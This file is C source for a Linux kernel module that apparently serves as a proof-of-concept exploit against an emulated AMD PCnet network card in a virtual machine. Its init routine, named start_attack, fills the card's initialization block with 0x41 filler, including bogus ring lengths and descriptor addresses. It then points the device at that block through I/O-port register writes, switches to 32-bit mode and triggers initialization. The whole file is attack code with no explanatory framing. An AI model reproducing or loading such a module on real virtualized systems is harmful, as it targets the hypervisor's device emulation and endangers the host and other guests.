#include <linux/module.h>
#include <linux/init.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <asm/io.h>

#define BASE_IO 0xc000
#define BASE_MEM_ONE 0xfeb80000
#define BASE_MEM_TWO 0xfebd1000

#define BCR_MSRDA    0
#define BCR_MSWRA    1
#define BCR_MC       2
#define BCR_LNKST    4
#define BCR_LED1     5
#define BCR_LED2     6
#define BCR_LED3     7
#define BCR_FDC      9
#define BCR_BSBC     18
#define BCR_EECAS    19
#define BCR_SWS      20
#define BCR_PLAT     22

typedef struct pcnet_initblk32 {
    uint16_t mode;
    uint8_t rlen;
    uint8_t tlen;
    uint16_t padr[3];
    uint16_t _res;
    uint16_t ladrf[4];
    uint32_t rdra;
    uint32_t tdra;
} pcnet_initblk32;

typedef struct pcnet_TMD {
    uint32_t tbadr;
    int16_t length;
    int16_t status;
    uint32_t misc;
    uint32_t res;
} pcnet_TMD;

void set_rap(u16 val){
    outw(val,BASE_IO+0x12);
}

void set_bcr(u16 idx,u16 val){
    set_rap(idx);
    outw(val,BASE_IO+0x16);
}

void set_csr(u16 idx,u16 val){
    // set_bcr(BCR_BSBC,~0x80);
    set_rap(idx);
    outw(val,BASE_IO+0x10);
}

void set_phys_addr(u32 val){
    u16 low_addr = val & 0xFFFF;
    u16 high_addr = (val >> 16) & 0xFFFF;
    // set_csr(0,4);// set csr_stop
    set_csr(1,low_addr);
    set_csr(2,high_addr);
}

static int start_attack(void){
    void *new_area;
    pcnet_initblk32 *initblk;

    new_area = kmalloc(sizeof(pcnet_initblk32),GFP_KERNEL);
    memset(new_area,0,sizeof(pcnet_initblk32));
    initblk = new_area;

    //init pcnet

    initblk->mode = 0x4141;
    initblk->rlen = 0x41;
    initblk->tlen = 0x41;
    initblk->padr[0] = 0x4141;
    initblk->padr[1] = 0x4141;
    initblk->padr[2] = 0x4141;
    initblk->_res = 0x4141;
    initblk->ladrf[0] = 0x4141;
    initblk->ladrf[1] = 0x4141;
    initblk->ladrf[2] = 0x4141;
    initblk->ladrf[3] = 0x4141;
    initblk->rdra = 0x41414141;
    initblk->tdra = 0x41414141;
    
    // printk("the byte is :%x\n",initblk->_res);
    // mdelay(100);
    set_phys_addr(virt_to_phys(new_area));
    printk("the byte is :%llx\n",virt_to_phys(new_area));
    mdelay(2000);
    set_bcr(BCR_SWS,0x1); // BCR_SSIZE32 -> tru
    mdelay(2000);
    printk("the byte is :%x\n",*((u8 *)new_area));
    set_csr(0,1);

    return 0;
}

static void exit_attack(void){
	printk("exp exit.\n");
}

module_init(start_attack);
module_exit(exit_attack);

MODULE_LICENSE("GPL");